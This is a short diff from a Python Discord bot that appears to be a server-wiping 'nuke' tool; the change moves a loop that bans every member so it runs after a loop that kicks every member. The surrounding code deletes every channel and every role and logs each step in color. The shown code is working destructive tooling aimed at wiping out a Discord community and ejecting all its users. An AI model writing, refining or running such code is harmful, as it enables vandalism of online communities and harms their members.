@@ -55,16 +55,16 @@ async def help(ctx):
         print(Fore.GREEN + f"{channel.name} wasn't deleted" + Fore.RESET)
     for member in guild.members:
      try:
-       await member.ban()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
-     except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't banned" + Fore.RESET)
-    for member in guild.members:
-     try:
        await member.kick()
        print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was kicked" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't kicked" + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't banned" + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
